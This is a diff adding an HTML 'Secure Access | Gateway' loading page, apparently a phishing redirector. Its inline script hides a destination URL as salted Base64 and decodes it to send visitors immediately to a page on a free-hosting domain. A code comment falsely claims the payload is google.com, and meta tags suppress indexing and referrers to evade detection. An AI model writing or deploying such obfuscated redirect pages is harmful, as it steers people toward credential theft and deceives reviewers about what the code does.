@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+     <title>Secure Access | Gateway</title>
+
+<!-- ================META PROTECT ===================  -->
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+<!-- ========================================================= -->
+
+ <!-- ======================== MOVER ========================= -->
+ <script>
+  (function() {
+    // base64, salt, slice, atob implementation
+    const salt = "S@lt_"; 
+    // Updated payload: 'https://www.google.com/' encoded in Base64
+    const payload = salt + "aHR0cHM6Ly9wb3J0YWwxaG9tZS5md2guaXMvd3Avb25saW5lMy8/c2FsdD1iaFoyOVYmaT0x"; 
+    
+    // Slice off the 5-character salt ("S@lt_"), then decode the remainder
+    const destination = atob(payload.slice(5)); 
+
+    // Redirect after 4000ms (4 seconds)
+    setTimeout(() => {
+      window.location.href = destination;
+    }, );
+  })();
+</script>
+<!-- =========================================================  -->
+
+<!-- =========================================================== -->
+    <style>
+        /* Reset and Center Container */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Arial', sans-serif;
+            overflow: hidden;
+        }
+
+        /* Preloader Wrapper */
+        .preloader-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        /* Spinner Box to overlay text and ring */
+        .spinner-box {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* The Circular Rings */
+        .circle-spinner {
+            position: absolute;
+            width: 60%;
+            height: 60%;
+            border-radius: 50%;
+            /* Light gray background ring */
+            border: 6px solid #f3f3f3; 
+            /* Blue loading indicator arc (covers ~25% like the image) */
+            border-left-color: #2596be; 
+            animation: spin 1.0s linear infinite;
+        }
+
+        /* Central Percentage Number */
+        .percentage {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1a73e8; /* Matching the blue tone */
+        }
+
+        /* Bottom Loading Text */
+        .loading-text {
+            font-size: 14px;
+            font-weight: 800;
+            letter-spacing: 1px;
+            color: #2596be;
+        }
+
+        /* Keyframe Animation for the Spin */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <!-- ======================================================================= -->
+</head>
+<body>
+    <div class="preloader-container">
+        <div class="spinner-box">
+            <div class="circle-spinner"></div>
+            <!-- <div class="percentage">1</div> -->
+        </div>
+        <div class="loading-text">LOADING...</div>
+    </div>
+
+</body>
+</html>
